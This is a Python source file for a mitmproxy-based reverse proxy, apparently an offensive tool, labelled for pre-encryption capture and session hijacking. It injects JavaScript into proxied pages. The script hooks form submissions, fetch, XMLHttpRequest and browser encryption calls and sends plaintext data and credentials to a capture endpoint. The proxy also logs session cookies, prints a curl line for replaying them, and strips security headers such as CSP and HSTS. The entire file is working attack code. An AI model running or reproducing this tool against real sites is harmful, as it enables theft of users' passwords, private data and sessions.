# mitm_reverse_proxy.py

"""
MITM Reverse Proxy - Pre-Encryption Capture + Session Hijack
"""

import argparse
import asyncio
import json
import logging
from urllib.parse import urlparse

from mitmproxy import http
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster

from mitm_auth_logger import CredentialsLogger

INJECTED_SCRIPT = """
<script>
(function() {
    function sendCapture(type, url, payload) {
        navigator.sendBeacon('/mitm-capture', JSON.stringify({type, url, payload}));
    }

    function hookForms() {
        document.querySelectorAll('form').forEach(form => {
            if (form._hooked) return;
            form._hooked = true;
            form.addEventListener('submit', function() {
                const data = {};
                new FormData(form).forEach((v, k) => data[k] = v);
                sendCapture('form', form.action || location.href, data);
            }, true);
        });
    }

    const _fetch = window.fetch;
    window.fetch = function(url, opts={}) {
        if (url !== '/mitm-capture' && opts.body) {
            try { sendCapture('fetch', url, JSON.parse(opts.body)); } catch(_) {}
        }
        return _fetch.apply(this, arguments);
    };

    const _open = XMLHttpRequest.prototype.open;
    const _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(m, url) {
        this._u = url;
        return _open.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
        if (body && this._u !== '/mitm-capture') {
            try { sendCapture('xhr', this._u, JSON.parse(body)); } catch(_) {}
        }
        return _send.apply(this, arguments);
    };

    const _encrypt = window.crypto.subtle.encrypt.bind(window.crypto.subtle);
    window.crypto.subtle.encrypt = function(algo, key, data) {
        try {
            sendCapture('crypto', location.href, {
                algorithm: algo.name,
                plaintext: new TextDecoder().decode(data)
            });
        } catch(_) {}
        return _encrypt(algo, key, data);
    };

    if (window.CryptoJS) {
        ['AES', 'DES', 'TripleDES', 'Rabbit', 'RC4'].forEach(algo => {
            if (!CryptoJS[algo]) return;
            const _enc = CryptoJS[algo].encrypt;
            CryptoJS[algo].encrypt = function(data, key) {
                sendCapture('cryptojs', location.href, {algorithm: algo, plaintext: String(data)});
                return _enc.apply(this, arguments);
            };
        });
    }

    hookForms();
    document.addEventListener('DOMContentLoaded', hookForms);
    new MutationObserver(hookForms).observe(document.documentElement, {childList:true, subtree:true});
})();
</script>
"""


def print_capture(source, url, data):
    print("\n" + "="*60)
    print(f"  🔐 CAPTURE [{source.upper()}]")
    print(f"  URL : {url}")
    print(f"  {'─'*54}")
    if isinstance(data, dict):
        for k, v in data.items():
            print(f"  {k:<20} : {v}")
    else:
        print(f"  {data}")
    print("="*60 + "\n")


def print_session(url, cookies):
    print("\n" + "*"*60)
    print(f"  🍪 SESSION HIJACK — COOKIE CAPTURED")
    print(f"  URL : {url}")
    print(f"  {'─'*54}")
    for cookie in cookies:
        print(f"  {cookie}")
    print(f"  {'─'*54}")
    print(f"  Replay with curl:")
    # Build cookie string for curl from all captured cookies
    cookie_pairs = []
    for cookie in cookies:
        pair = cookie.split(";")[0].strip()  # grab name=value only
        cookie_pairs.append(pair)
    print(f'  curl -s http://127.0.0.1:8080/ -H "Cookie: {"; ".join(cookie_pairs)}"')
    print("*"*60 + "\n")


class ReverseProxyAddon:
    def __init__(self, target):
        self.parsed        = urlparse(target.rstrip("/"))
        self.target_host   = self.parsed.hostname
        self.target_port   = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.target_scheme = self.parsed.scheme
        self.target_origin = f"{self.parsed.scheme}://{self.parsed.netloc}"
        # Logger integrated
        self.logger = CredentialsLogger()

    def request(self, flow: http.HTTPFlow):
        # Intercept capture POSTs from injected JS
        if flow.request.path == "/mitm-capture":
            if flow.request.method == "POST":
                try:
                    body = json.loads(flow.request.get_text())
                    # Log to file via Integrated Logger - 4/4
                    self.logger.process_event(
                        f"JS_CAPTURE_{body.get('type', 'UNK').upper()}",
                        body.get("url", flow.request.pretty_url),
                        "POST",
                        body.get("payload", {})
                    )
                except Exception as e:
                    logging.warning(f"Capture parse error: {e}")
            flow.response = http.Response.make(204, b"", {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Headers": "Content-Type",
            })
            return

        # Repoint to backend
        flow.request.host   = self.target_host
        flow.request.port   = self.target_port
        flow.request.scheme = self.target_scheme
        flow.request.headers["host"] = self.parsed.netloc
        for h in ("x-forwarded-for", "x-real-ip", "via", "forwarded"):
            flow.request.headers.pop(h, None)

    def response(self, flow: http.HTTPFlow):
        resp = flow.response
        ct   = resp.headers.get("content-type", "")

        # ── Session cookie capture ──────────────────────────────
        all_cookies = resp.headers.get_all("set-cookie")
        if all_cookies:
            self.logger.process_event(
                event_type="SESSION_COOKIE",
                request_url=flow.request.pretty_url,
                request_method="SET-COOKIE",
                request_payload={"set-cookie": all_cookies}
            )

        # ── Login success hint ──────────────────────────────────
        if flow.request.method == "POST" and resp.status_code in (301, 302, 303, 307, 308):
            print(f"  ↳ Redirect after POST ({resp.status_code}) → likely successful login")

        # ── Strip security headers ──────────────────────────────
        for h in ("content-security-policy", "content-security-policy-report-only",
                  "x-frame-options", "strict-transport-security"):
            resp.headers.pop(h, None)

        # ── Rewrite redirects ───────────────────────────────────
        if "location" in resp.headers:
            loc = resp.headers["location"]
            if loc.startswith(self.target_origin):
                resp.headers["location"] = loc[len(self.target_origin):]

        # ── Rewrite + inject ────────────────────────────────────
        if "text/html" in ct or "text/css" in ct:
            try:
                text = resp.get_text(strict=False)
                text = text.replace(self.target_origin + "/", "/").replace(self.target_origin, "/")

                if "text/html" in ct:
                    if "<head>" in text:
                        text = text.replace("<head>", "<head>" + INJECTED_SCRIPT, 1)
                    elif "</body>" in text:
                        text = text.replace("</body>", INJECTED_SCRIPT + "</body>", 1)
                    else:
                        text += INJECTED_SCRIPT

                resp.set_text(text)
            except Exception as e:
                logging.warning(f"Inject failed: {e}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", required=True)
    parser.add_argument("--port",   "-p", type=int, default=8080)
    args   = parser.parse_args()

    target   = args.target if args.target.startswith("http") else f"https://{args.target}"
    upstream = f"{urlparse(target).scheme}://{urlparse(target).netloc}"

    print(f"\n┌──────────────────────────────────────────┐")
    print(f"│  MITM Proxy — Capture + Session Hijack   │")
    print(f"│  Listen : http://127.0.0.1:{args.port:<14}│")
    print(f"│  Target : {upstream:<30}│")
    print(f"│  Ctrl+C to stop                          │")
    print(f"└──────────────────────────────────────────┘\n")

    opts = Options(
        listen_host="127.0.0.1",
        listen_port=args.port,
        mode=[f"reverse:{upstream}"],
        ssl_insecure=True,
    )

    async def run():
        master = DumpMaster(opts, with_termlog=True, with_dumper=False)
        master.addons.add(ReverseProxyAddon(target))
        await master.run()

    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    main()